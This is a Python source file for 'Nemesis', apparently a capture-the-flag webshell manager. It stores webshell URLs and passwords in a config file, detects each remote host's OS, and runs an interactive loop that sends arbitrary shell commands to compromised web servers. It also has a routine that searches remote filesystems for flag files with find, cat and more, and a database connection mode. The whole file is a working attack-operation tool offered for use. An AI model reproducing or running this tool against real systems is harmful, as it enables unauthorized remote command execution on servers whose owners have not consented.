"""
" Nemesis is a webshell manager tool
" @Author: EddieIvan
" @Blog: http://iv4n.xyz
" @Github: https://github.com/eddieivan01
"""

import json
import re
import sys
import argparse

import exploit.exp as exp
from dbconnector import handler_db as db



class ShellManager(object):
    
    """
    " This is main loop obj
    " Use it by
    "
    " with ShellManager() as manager:
    "     pass
    "
    " When it exits, it will write shells' config to 'config.json'
    """
    
    def __init__(self, isManagerMode=False):
        print("[+]Initialize...")
        self.isManagerMode = isManagerMode
        if isManagerMode:
            self.parse_config()
    
    def parse_config(self):
        """
        " Parse config file to get shells list
        """
        try:
            tmp = open("config.json", "r")
            self.config = json.loads(tmp.read())
        except FileNotFoundError:
            print("[!]Config file doesnt exit")
            sys.exit()
        except json.JSONDecodeError:
            print("[!]Json format error")
            sys.exit()
        finally:
            tmp.close()
            
        self.shell_list = []
        self.shell_obj_list = []
        
        for i in self.config["shell"]:
            """
            Default os is Linux
            because of ctf
            judge if is Linux
            if not
            change obj to WindowsEXP
            """
            self.shell_list.append(i)
            if not i["lang"]:
                i["lang"] = i["url"].split(".")[-1]
            tmp_obj = exp.LinuxEXP(i["url"], i["pwd"], i["lang"], proxies)
            
            if not tmp_obj.judge_os():
                tmp_obj = exp.WindowsEXP(i["url"], i["pwd"], i["lang"], proxies)
            self.shell_obj_list.append(tmp_obj)
            
    def __enter__(self):
        return self
    
    def __exit__(self, e_type, e_value, e_traceback):
        """
        " Write config file
        " Config is save in RAM when program runs
        " And it can be changed 
        " Need to write to hard disk
        """
        self.config["shell"] = self.shell_list
        tmp = open("config.json", "w")
        tmp.write(json.dumps(self.config))
        tmp.close()
    
    def flag(self, index, _dir):
        """
        This function is used to help you to find the flag in ctf
        when you get the shell
        if chinese words in dir whem OS is Windows, it will have some bugs
        """
        flag_regexp = re.compile(r"(\w+\{[-\w]+\})")
        obj = self.shell_obj_list[int(index)]

        if obj.sys == "win":
            tmp = obj.post_cmd_shell("for /r {}:\ %i in (flag.*) do @echo %i".format(_dir))
            print("\n[+]Flag files:")
            print(tmp)
            tmp_list = tmp.split("\n")[:-1]
            for i in tmp_list:
                try:
                    text = obj.post_cmd_shell("more "+i)
                    text = flag_regexp.findall(text)
                    if not text:
                        print("[+]No flag found in: "+i+"\n")
                    else:
                        for j in text:
                            print("[+]Flag found in "+i+": "+j+"\n")
                except:
                    continue

        elif obj.sys == "linux":
            tmp_1 = obj.post_cmd_shell("find {} -name flag".format(_dir))
            tmp_2 = obj.post_cmd_shell("find {} -name flag.*".format(_dir))
            tmp_list = tmp_1.split("\n")[:-1] + tmp_2.split("\n")[:-1]
            print("\n[+]Flag files:")
            for i in tmp_list:
                print(i)
            print()
            for i in tmp_list:
                try:
                    text = obj.post_cmd_shell("cat "+i)
                    text = flag_regexp.findall(text)
                    if not text:
                        print("[+]No flag found in: "+i+"\n")
                    else:
                        for j in text:
                            print("[+]Flag found in "+i+": "+j+"\n")
                except:
                    continue
                
    def only_one_shell_loop(self, url, pwd, lang, proxies=None):
        """
        " One shell manager mode
        " Shell exec loop
        """
        a = exp.LinuxEXP(url, pwd, lang, proxies)
        if not a.judge_os():
            a = exp.WindowsEXP(url, pwd, lang, proxies)
        print("[+]Set URL => "+a._url)
        print("[+]Set Language => "+a._lang)
        print("[+]Set Encode => "+a.sys_encode)
        print("[+]enter `set encode xxx` to change encode")
        while True:
            print(a.current_dic+"> ", end="")
            arg = input()
            if arg.lower() == "exit":
                return
            elif "set encode" in arg.lower():
                enc = arg.lower().strip().split(" ")[-1]
                a.sys_encode = enc
                print("[+]Change encode to "+enc+"\n")
                continue
            print(a.post_cmd_shell(arg))
            
    def shell_loop(self, shell_id):
        """
        " Manager mode
        " Shell exec loop
        """
        a = self.shell_obj_list[shell_id]
        print("[+]Set URL => "+a._url)
        print("[+]Set Language => "+a._lang)
        print("[+]Set Encode => "+a.sys_encode)
        while True:
            print(a.current_dic+"> ", end="")
            arg = input()
            if arg.lower() == "exit":
                return
            print(a.post_cmd_shell(arg))            
        
    def show_shell(self):
        """
        " Show every shells in config file
        """
        print("\n[*]Webshell list")
        for index, shell in enumerate(self.shell_obj_list):
            print("["+str(index)+"] ", end="")
            print(shell)
    
    @staticmethod
    def manager_mode_help():
        print("[*]Manager mode command:\n" 
              "     enter [index]                       --choose a shell to use\n"
              "     set [index]:[encode | pwd] xxx      --change shells' encode or passwd\n"
              "     flag                                --find flag in ctf\n"
              "     exit"
        )
        
    def main_loop(self, url="", pwd="", lang=""):
        """
        " Main program loop
        " Parse command
        " -set [index]:[encode | pwd] xxx
        " -enter [index]
        """
        if self.isManagerMode:
            self.manager_mode_help()
            
            while True:
                """
                If u want to flush the screen
                delete these comments
                and u should delete which comment depends on your OS
                """
                # Flush screen
                # Linux terminal flush screen
                #print("\033[2J")
                # Windows dos flush screen
                #os.system("cls")
                #banner()
                self.show_shell()
                print("\n@Nemesis> ", end="")
                cmd = input()
                if cmd.lower() == "exit":
                    return
                elif re.findall(r"flag", cmd.lower()):
                    index = input("[+]Enter index: ")
                    _dir = input("[+]Enter dir: ")
                    self.flag(index, _dir)
                elif re.findall(r"set \d+:\w+ [\w-]+", cmd.lower()):
                    if "encode" in cmd.lower():
                        self.shell_obj_list[int(re.findall(r"set (\d+):encode [\w-]+", cmd.lower())[0])].\
                            encode = re.findall(r"set \d+:encode ([\w-]+)", cmd.lower())[0]
                    elif "pwd" in cmd.lower():
                        pwd_t = re.findall(r"set \d+:pwd ([\w-]+)", cmd.lower())[0]
                        self.shell_list[int(re.findall(r"set (\d+):pwd [\w-]+", cmd.lower())[0])]["pwd"] = pwd_t
                        self.shell_obj_list[int(re.findall(r"set (\d+):pwd [\w-]+", cmd.lower())[0])].pwd = pwd_t
                elif re.findall(r"enter \d+", cmd.lower()):
                    print("\n[+]Enter shell index: "+re.findall(r"enter (\d+)", cmd.lower())[0])
                    self.shell_loop(int(re.findall(r"enter (\d+)", cmd.lower())[0]))
                else:
                    print("[!]Unrecognize command")
        else:
            while True:
                self.only_one_shell_loop(url, pwd, lang)
                
                
def banner():
    print(\
        '''
         _   _                                   _       
        | \ | |   ___   _ __ ___     ___   ___  (_)  ___ 
        |  \| |  / _ \ | '_ ` _ \   / _ \ / __| | | / __|
        | |\  | |  __/ | | | | | | |  __/ \__ \ | | \__ \ 
        |_| \_|  \___| |_| |_| |_|  \___| |___/ |_| |___/
        
             /* Webshell Manager */
        '''
    )
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage="\n  Manager mode(for manage shells):  ./nemesis.py [-h] [-p PROXY]\n"\
                                            "  Normal mode(for only one shell):  ./nemesis.py URL PASSWD [-h] [-l LANG] [-p PROXY]\n"
                                            "  DB mode(for connect to database): ./nemesis.py DBURI(e.g. mysql://root:test123@127.0.0.1:3306) [-h]"
                                            )
    banner()
    
    t = ''.join(sys.argv)
    """
    To support two modes
    """
    if "mysql" in t or "mssql" in t:
        parser.add_argument("dburi", type=str, help="db's uri", default="")
    elif ("http" in t and t.count("-phttp")==0 and t.count("--proxyhttp")==0) \
         or (t.count("http")==2):
        parser.add_argument("shell", type=str, help="webshell's addr", default="")
        parser.add_argument("pwd", type=str, help="webshell's passwd", default="")
    
    parser.add_argument("-l", "--lang", type=str, dest="lang", 
            help="if webshell's language is diffrent"\
            " to file suffix name, use it", default="")
    parser.add_argument("-p", "--proxy", type=str, dest="proxy", default="",
            help="requests' proxy, e.g: socks5://127.0.0.1:1080")
    args = parser.parse_args(sys.argv[1:])
    
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print("[+]Use proxy: "+args.proxy)
    
    isManagerMode = False
    if hasattr(args, "dburi"):
        db(args.dburi)    
    elif not hasattr(args, "shell") or not hasattr(args, "pwd"):
        isManagerMode = True
        with ShellManager(isManagerMode) as manager:
            manager.main_loop()
    else:
        if not args.lang:
            args.lang = args.shell.split(".")[-1]
        ShellManager(isManagerMode).only_one_shell_loop(args.shell, args.pwd, 
                                                        args.lang, proxies)
        
